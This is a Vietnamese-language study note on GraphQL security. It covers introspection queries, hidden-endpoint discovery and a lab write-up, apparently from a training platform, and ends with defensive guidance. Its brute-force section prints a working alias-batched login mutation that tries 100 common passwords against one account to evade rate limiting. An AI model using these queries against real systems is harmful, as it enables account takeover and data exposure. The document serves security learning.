# **GraphQL API**

- Các lỗ hổng GraphQL thường phát sinh do lỗi triển khai và thiết kế.
- Các cuộc tấn công GraphQL thường ở dạng các request độc hại có thể cho phép kẻ tấn công lấy dữ liệu hoặc thực hiện các hành động trái phép. Các cuộc tấn công này có thể có tác động nghiêm trọng, đặc biệt nếu người dùng có thể giành được đặc quyền quản trị viên bằng cách thao tác query hoặc thực hiện khai thác CSRF. API GraphQL dễ bị tổn thương cũng có thể dẫn đến các vấn đề tiết lộ thông tin.

![](./img_GraphQL_API/Screenshot%202023-08-25%20210743.png)

## **GraphQL là gì?**

- GraphQL là ngôn ngữ query API được thiết kế để hỗ trợ giao tiếp hiệu quả giữa máy khách và máy chủ. Nó cho phép người dùng chỉ định chính xác dữ liệu họ muốn trong phản hồi, giúp tránh các đối tượng phản hồi lớn và nhiều lệnh gọi đôi khi có thể thấy bằng API REST.

- Các dịch vụ GraphQL xác định một hợp đồng mà qua đó khách hàng có thể giao tiếp với máy chủ. Khách hàng không cần biết dữ liệu nằm ở đâu. Thay vào đó, máy khách gửi query đến máy chủ GraphQL để tìm nạp dữ liệu từ những nơi có liên quan. Vì GraphQL không phụ thuộc vào nền tảng nên nó có thể được triển khai bằng nhiều ngôn ngữ lập trình và có thể được sử dụng để giao tiếp với hầu hết mọi kho lưu trữ dữ liệu.

## **Cách thức hoạt động của GraphQL**

- 3 hoạt động chính GraphQL:
    - query tìm nạp dữ liệu
    - Thêm, xóa, thay đổi dữ liệu
    - Đăng ký tương tự như query nhưng thiết lập kết nối vĩnh viễn để máy chủ có thể chủ động đẩy dữ liệu đến máy khách theo định dạng đã chỉ định.

- GraphQL thường được gửi bằng request POST, và các phản hồi của GraphQL dưới dang JSON.

## **GraphQL schema là gì?**

- GraphQL schema :định nghĩa dữ liệu có sẵn dưới dạng một loạt các loại, sử dụng ngôn ngữ định nghĩa lược đồ mà con người có thể đọc được.

```
#Example schema definition

    type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }

Các toán tử "!" chỉ ra rằng trường này không thể rỗng khi được gọi (nghĩa là bắt buộc).
```

## **query GraphQL schema**

- Ví dụ bên dưới hiển thị query có tên `myGetProductQuery` yêu cầu `name` và `description` của sản phẩm có id là 123.

```
    #Example query

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }

```


- Ví dụ thêm một đối tượng GraphQL

```
    #Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }



 #Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }
```

## **Các thành phần của GraphQL**

> `Field`

```
 #Request

    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }

------------------------------------------------------------------------------------------------------------------------
  #Response

    {
        "data": {
            "getEmployees": [
                {
                    "id": 1,
                    "name" {
                        "firstname": "Carlos",
                        "lastname": "Montoya"
                    }
                },
                {
                    "id": 2,
                    "name" {
                        "firstname": "Peter",
                        "lastname": "Wiener"
                    }
                }
            ]
        }
    }
```

> `Arguments`

```
   #Example query with arguments

    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }
------------------------------------------------------------------------------------------------------------------------
    #Response to query

    {
        "data": {
            "getEmployees": [
            {
                "name" {
                    "firstname": Carlos,
                    "lastname": Montoya
                    }
                }
            ]
        }
    }
```

> `Variables`

- Các biến cho phép bạn truyền các đối số động thay vì có các đối số trực tiếp trong chính query đó.

- query dựa trên biến sử dụng cấu trúc giống như query sử dụng đối số nội tuyến, nhưng một số khía cạnh nhất định của query được lấy từ từ điển biến dựa trên JSON riêng biệt. Chúng cho phép bạn sử dụng lại cấu trúc chung giữa nhiều query, chỉ có giá trị của biến đó thay đổi.

```

    #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
```

> `Aliases`

- Đối tượng GraphQL không thể chứa nhiều thuộc tính có cùng tên. Ví dụ: query sau không hợp lệ vì nó cố gắng trả về loại sản phẩm hai lần.

```
#Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
```
- 

```
  #Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }
```

> `Fragments`

- Fragments là các phần có thể tái sử dụng của query hoặc xóa thêm dữ liệu. Chúng chứa một tập hợp con các trường thuộc loại liên quan.

- Sau khi được xác định, chúng có thể được đưa vào các query hoặc xóa thêm dữ liệu. Nếu sau đó chúng được thay đổi thì thay đổi đó sẽ được bao gồm trong mọi query hoặc xóa thêm dữ liệu gọi phân đoạn.

```
   #Example fragment

    fragment productInfo on Product {
        id
        name
        listed
    }

    #Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }

      #Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extractor",
                "listed": "no",
                "stock": 5
            }
        }
    }
```


## **Tìm kiếm các GraphQL endpoints**

- Trước khi có thể kiểm tra API GraphQL, trước tiên bạn cần tìm điểm cuối của nó. Vì API GraphQL sử dụng cùng một điểm cuối cho tất cả các yêu cầu nên đây là một thông tin có giá trị.

> **`Universal queries (query chung)`**

- Nếu bạn gửi `query{__typename}` đến bất kỳ điểm cuối GraphQL nào, nó sẽ bao gồm chuỗi `{"data": {"__typename": "query"}}` ở đâu đó trong phản hồi của nó. Đây được gọi là query chung và là công cụ hữu ích trong việc kiểm tra xem URL có tương ứng với dịch vụ GraphQL hay không.

> **`Các endpoint names phổ biến`**

- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql

> **`Request methods`**

- Có request Post dữ liệu gửi đi dưới dạng JSON

## **Khám phá thông tin schema**

- Bước tiếp theo trong việc kiểm tra API là ghép các thông tin về lược đồ cơ bản lại với nhau.

- Cách tốt nhất để làm điều này là sử dụng các truy vấn introspection. Introspection là một hàm GraphQL tích hợp cho phép bạn truy vấn máy chủ để biết thông tin về lược đồ.

- Việc xem xét introspection giúp bạn hiểu cách bạn có thể tương tác với API GraphQL. Nó cũng có thể tiết lộ dữ liệu có khả năng nhạy cảm, chẳng hạn như trường mô tả.

### **Sử dụng introspection**

> `Probing for introspection`

- Bạn có thể thăm dò sự xem xét introspection bằng cách sử dụng truy vấn đơn giản sau đây. Nếu tính năng xem xét introspection được bật, phản hồi sẽ trả về tên của tất cả các truy vấn có sẵn.


```
#Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
```

> `Running a full introspection query`

```
#Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

```

- Sau khi nhận được kết quả sử dụng công cụ sau đây để nhìn một cách trực quan: [**GraphQL visualizer**](http://nathanrandal.com/graphql-visualizer/)


## **LAB-Exploite**

> `Lab: Accessing private GraphQL posts`

- Ở đây chúng ta có một blog. Trang web đã truy vấn bằng GraphQL để lấy dữ liệu.

![](./img_GraphQL_API/Screenshot%202023-08-28%20104656.png)

- Trức khi trang web truy vấn với id bằng 5, thì nó đã truy vấn để lấy thông tin tất cả nhưng thiếu id bằng 3. Bây giờ tôi sẽ thử truy vấn với `id:3`

- Tôi đã thực hiện scan qua một lần và thấy được một vài trường kì lạ như `postPassword`

- Tôi thực hiện tìm postPassword như sau:

![](./img_GraphQL_API/Screenshot%202023-08-28%20105616.png)

> `Lab: Accidental exposure of private GraphQL fields`

- Bước đầu tiên, tôi thực hiện scaner GraphQL ta được như sau:

![](./img_GraphQL_API/Screenshot%202023-08-28%20111935.png)

![](./img_GraphQL_API/Screenshot%202023-08-28%20111500.png)

- Vậy tôi có thể tìm được tài khoản admin.


## **Bypassing GraphQL introspection defences**

![](./img_GraphQL_API/Screenshot%202023-08-28%20113343.png)

> `Lab: Finding a hidden GraphQL endpoint`

- Đối với lab này dường như GraphQL endpoint đã bị ẩn đi. Tôi đã thử truy vấn GET với `/api`

![](./img_GraphQL_API/Screenshot%202023-08-28%20114733.png)


- Và đã báo cho chúng ta thiếu truy vấn `Query`. Và chúng ta đã thành công tìm được một endpoint

![](./img_GraphQL_API/Screenshot%202023-08-28%20114934.png)

- Tôi thực hiện query hết thông tin và ném vào tool để nhìn một cách tổng quat hơn.

![](./img_GraphQL_API/Screenshot%202023-08-28%20120201.png)

- Vận dụng thông tin trước đó tôi đã có thể viết truy vấn GraphQL để xóa user:

![](./img_GraphQL_API/Screenshot%202023-08-28%20131413.png)

## **Bypassing rate limiting using aliases**

- Mặc dù aliases nhằm mục đích giới hạn số lượng lệnh gọi API bạn cần thực hiện, nhưng chúng cũng có thể được sử dụng để ép buộc điểm cuối GraphQL.

- Nhiều điểm cuối sẽ có sẵn một số loại giới hạn tốc độ để ngăn chặn các cuộc tấn công vũ phu. Một số bộ giới hạn tốc độ hoạt động dựa trên số lượng yêu cầu HTTP nhận được thay vì số lượng thao tác được thực hiện trên điểm cuối. Vì aliases cho phép bạn gửi nhiều truy vấn trong một tin nhắn HTTP một cách hiệu quả nên chúng có thể bỏ qua hạn chế này.

- Ví dụ đơn giản bên dưới hiển thị một loạt truy vấn aliases để kiểm tra xem mã giảm giá của cửa hàng có hợp lệ hay không. Hoạt động này có khả năng vượt qua giới hạn tốc độ vì đây là một yêu cầu HTTP duy nhất, mặc dù nó có thể được sử dụng để kiểm tra một số lượng lớn mã giảm giá cùng một lúc.

```
#Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```


>`Lab: Bypassing GraphQL brute force protections`

- Đối với trang web này tôi thực hiện scan qua một lần

![](./img_GraphQL_API/Screenshot%202023-08-28%20231136.png)

- Tôi phát hiện chức năng đăng nhập được truy vẫn GraphQL

![](./img_GraphQL_API/Screenshot%202023-08-28%20231824.png)

- Tôi sẽ thực hiện bruteforce với mật khẩu như sau

```


    mutation {
        
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }


bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
        token
        success
    }


bruteforce3:login(input:{password: "qwerty", username: "carlos"}) {
        token
        success
    }


bruteforce4:login(input:{password: "123456789", username: "carlos"}) {
        token
        success
    }


bruteforce5:login(input:{password: "12345", username: "carlos"}) {
        token
        success
    }


bruteforce6:login(input:{password: "1234", username: "carlos"}) {
        token
        success
    }


bruteforce7:login(input:{password: "111111", username: "carlos"}) {
        token
        success
    }


bruteforce8:login(input:{password: "1234567", username: "carlos"}) {
        token
        success
    }


bruteforce9:login(input:{password: "dragon", username: "carlos"}) {
        token
        success
    }


bruteforce10:login(input:{password: "123123", username: "carlos"}) {
        token
        success
    }


bruteforce11:login(input:{password: "baseball", username: "carlos"}) {
        token
        success
    }


bruteforce12:login(input:{password: "abc123", username: "carlos"}) {
        token
        success
    }


bruteforce13:login(input:{password: "football", username: "carlos"}) {
        token
        success
    }


bruteforce14:login(input:{password: "monkey", username: "carlos"}) {
        token
        success
    }


bruteforce15:login(input:{password: "letmein", username: "carlos"}) {
        token
        success
    }


bruteforce16:login(input:{password: "shadow", username: "carlos"}) {
        token
        success
    }


bruteforce17:login(input:{password: "master", username: "carlos"}) {
        token
        success
    }


bruteforce18:login(input:{password: "666666", username: "carlos"}) {
        token
        success
    }


bruteforce19:login(input:{password: "qwertyuiop", username: "carlos"}) {
        token
        success
    }


bruteforce20:login(input:{password: "123321", username: "carlos"}) {
        token
        success
    }


bruteforce21:login(input:{password: "mustang", username: "carlos"}) {
        token
        success
    }


bruteforce22:login(input:{password: "1234567890", username: "carlos"}) {
        token
        success
    }


bruteforce23:login(input:{password: "michael", username: "carlos"}) {
        token
        success
    }


bruteforce24:login(input:{password: "654321", username: "carlos"}) {
        token
        success
    }


bruteforce25:login(input:{password: "superman", username: "carlos"}) {
        token
        success
    }


bruteforce26:login(input:{password: "1qaz2wsx", username: "carlos"}) {
        token
        success
    }


bruteforce27:login(input:{password: "7777777", username: "carlos"}) {
        token
        success
    }


bruteforce28:login(input:{password: "121212", username: "carlos"}) {
        token
        success
    }


bruteforce29:login(input:{password: "000000", username: "carlos"}) {
        token
        success
    }


bruteforce30:login(input:{password: "qazwsx", username: "carlos"}) {
        token
        success
    }


bruteforce31:login(input:{password: "123qwe", username: "carlos"}) {
        token
        success
    }


bruteforce32:login(input:{password: "killer", username: "carlos"}) {
        token
        success
    }


bruteforce33:login(input:{password: "trustno1", username: "carlos"}) {
        token
        success
    }


bruteforce34:login(input:{password: "jordan", username: "carlos"}) {
        token
        success
    }


bruteforce35:login(input:{password: "jennifer", username: "carlos"}) {
        token
        success
    }


bruteforce36:login(input:{password: "zxcvbnm", username: "carlos"}) {
        token
        success
    }


bruteforce37:login(input:{password: "asdfgh", username: "carlos"}) {
        token
        success
    }


bruteforce38:login(input:{password: "hunter", username: "carlos"}) {
        token
        success
    }


bruteforce39:login(input:{password: "buster", username: "carlos"}) {
        token
        success
    }


bruteforce40:login(input:{password: "soccer", username: "carlos"}) {
        token
        success
    }


bruteforce41:login(input:{password: "harley", username: "carlos"}) {
        token
        success
    }


bruteforce42:login(input:{password: "batman", username: "carlos"}) {
        token
        success
    }


bruteforce43:login(input:{password: "andrew", username: "carlos"}) {
        token
        success
    }


bruteforce44:login(input:{password: "tigger", username: "carlos"}) {
        token
        success
    }


bruteforce45:login(input:{password: "sunshine", username: "carlos"}) {
        token
        success
    }


bruteforce46:login(input:{password: "iloveyou", username: "carlos"}) {
        token
        success
    }


bruteforce47:login(input:{password: "2000", username: "carlos"}) {
        token
        success
    }


bruteforce48:login(input:{password: "charlie", username: "carlos"}) {
        token
        success
    }


bruteforce49:login(input:{password: "robert", username: "carlos"}) {
        token
        success
    }


bruteforce50:login(input:{password: "thomas", username: "carlos"}) {
        token
        success
    }


bruteforce51:login(input:{password: "hockey", username: "carlos"}) {
        token
        success
    }


bruteforce52:login(input:{password: "ranger", username: "carlos"}) {
        token
        success
    }


bruteforce53:login(input:{password: "daniel", username: "carlos"}) {
        token
        success
    }


bruteforce54:login(input:{password: "starwars", username: "carlos"}) {
        token
        success
    }


bruteforce55:login(input:{password: "klaster", username: "carlos"}) {
        token
        success
    }


bruteforce56:login(input:{password: "112233", username: "carlos"}) {
        token
        success
    }


bruteforce57:login(input:{password: "george", username: "carlos"}) {
        token
        success
    }


bruteforce58:login(input:{password: "computer", username: "carlos"}) {
        token
        success
    }


bruteforce59:login(input:{password: "michelle", username: "carlos"}) {
        token
        success
    }


bruteforce60:login(input:{password: "jessica", username: "carlos"}) {
        token
        success
    }


bruteforce61:login(input:{password: "pepper", username: "carlos"}) {
        token
        success
    }


bruteforce62:login(input:{password: "1111", username: "carlos"}) {
        token
        success
    }


bruteforce63:login(input:{password: "zxcvbn", username: "carlos"}) {
        token
        success
    }


bruteforce64:login(input:{password: "555555", username: "carlos"}) {
        token
        success
    }


bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
        token
        success
    }


bruteforce66:login(input:{password: "131313", username: "carlos"}) {
        token
        success
    }


bruteforce67:login(input:{password: "freedom", username: "carlos"}) {
        token
        success
    }


bruteforce68:login(input:{password: "777777", username: "carlos"}) {
        token
        success
    }


bruteforce69:login(input:{password: "pass", username: "carlos"}) {
        token
        success
    }


bruteforce70:login(input:{password: "maggie", username: "carlos"}) {
        token
        success
    }


bruteforce71:login(input:{password: "159753", username: "carlos"}) {
        token
        success
    }


bruteforce72:login(input:{password: "aaaaaa", username: "carlos"}) {
        token
        success
    }


bruteforce73:login(input:{password: "ginger", username: "carlos"}) {
        token
        success
    }


bruteforce74:login(input:{password: "princess", username: "carlos"}) {
        token
        success
    }


bruteforce75:login(input:{password: "joshua", username: "carlos"}) {
        token
        success
    }


bruteforce76:login(input:{password: "cheese", username: "carlos"}) {
        token
        success
    }


bruteforce77:login(input:{password: "amanda", username: "carlos"}) {
        token
        success
    }


bruteforce78:login(input:{password: "summer", username: "carlos"}) {
        token
        success
    }


bruteforce79:login(input:{password: "love", username: "carlos"}) {
        token
        success
    }


bruteforce80:login(input:{password: "ashley", username: "carlos"}) {
        token
        success
    }


bruteforce81:login(input:{password: "nicole", username: "carlos"}) {
        token
        success
    }


bruteforce82:login(input:{password: "chelsea", username: "carlos"}) {
        token
        success
    }


bruteforce83:login(input:{password: "biteme", username: "carlos"}) {
        token
        success
    }


bruteforce84:login(input:{password: "matthew", username: "carlos"}) {
        token
        success
    }


bruteforce85:login(input:{password: "access", username: "carlos"}) {
        token
        success
    }


bruteforce86:login(input:{password: "yankees", username: "carlos"}) {
        token
        success
    }


bruteforce87:login(input:{password: "987654321", username: "carlos"}) {
        token
        success
    }


bruteforce88:login(input:{password: "dallas", username: "carlos"}) {
        token
        success
    }


bruteforce89:login(input:{password: "austin", username: "carlos"}) {
        token
        success
    }


bruteforce90:login(input:{password: "thunder", username: "carlos"}) {
        token
        success
    }


bruteforce91:login(input:{password: "taylor", username: "carlos"}) {
        token
        success
    }


bruteforce92:login(input:{password: "matrix", username: "carlos"}) {
        token
        success
    }


bruteforce93:login(input:{password: "mobilemail", username: "carlos"}) {
        token
        success
    }


bruteforce94:login(input:{password: "mom", username: "carlos"}) {
        token
        success
    }


bruteforce95:login(input:{password: "monitor", username: "carlos"}) {
        token
        success
    }


bruteforce96:login(input:{password: "monitoring", username: "carlos"}) {
        token
        success
    }


bruteforce97:login(input:{password: "montana", username: "carlos"}) {
        token
        success
    }


bruteforce98:login(input:{password: "moon", username: "carlos"}) {
        token
        success
    }


bruteforce99:login(input:{password: "moscow", username: "carlos"}) {
        token
        success
    }

}

```

- Và tôi đã tìm dc mật khẩu vs bruteforce65 với mật khẩu: `11111111`

![](./img_GraphQL_API/Screenshot%202023-08-28%20232241.png)

## **Cách phòng chống tấn công GraphQL**

- Nếu API của bạn không dành cho công chúng sử dụng, hãy tắt tính năng xem xét nội tâm trên đó. Điều này khiến kẻ tấn công khó lấy được thông tin về cách hoạt động của API hơn và giảm nguy cơ tiết lộ thông tin không mong muốn.

- Nếu API của bạn được thiết kế cho công chúng sử dụng thì có thể bạn sẽ cần phải bật tính năng xem xét nội tâm. Tuy nhiên, bạn nên xem lại lược đồ của API để đảm bảo rằng lược đồ đó không hiển thị công khai các trường không mong muốn.

- Hãy chắc chắn rằng các đề xuất bị vô hiệu hóa. Điều này ngăn cản những kẻ tấn công có thể sử dụng Clairvoyance hoặc các công cụ tương tự để thu thập thông tin về lược đồ cơ bản.

- Đảm bảo rằng lược đồ API của bạn không hiển thị bất kỳ trường người dùng riêng tư nào, chẳng hạn như địa chỉ email hoặc ID người dùng.

## **Cách phòng chống GraphQL brute force attacks**

- Giới hạn độ sâu truy vấn của các truy vấn API của bạn. Thuật ngữ "độ sâu truy vấn" đề cập đến số cấp độ lồng trong một truy vấn. Các truy vấn lồng nhau nhiều có thể có tác động đáng kể đến hiệu suất và có khả năng tạo cơ hội cho các cuộc tấn công DoS nếu chúng được chấp nhận. Bằng cách giới hạn độ sâu truy vấn mà API của bạn chấp nhận, bạn có thể giảm khả năng điều này xảy ra.

- Cấu hình giới hạn hoạt động. Giới hạn hoạt động cho phép bạn định cấu hình số lượng trường duy nhất, bí danh và trường gốc tối đa mà API của bạn có thể chấp nhận.

- Định cấu hình số byte tối đa mà một truy vấn có thể chứa.

- Hãy xem xét triển khai phân tích chi phí trên API của bạn. Phân tích chi phí là một quá trình trong đó ứng dụng thư viện xác định chi phí tài nguyên liên quan đến việc chạy các truy vấn khi chúng được nhận. Nếu một truy vấn quá phức tạp về mặt tính toán để chạy thì API sẽ loại bỏ nó.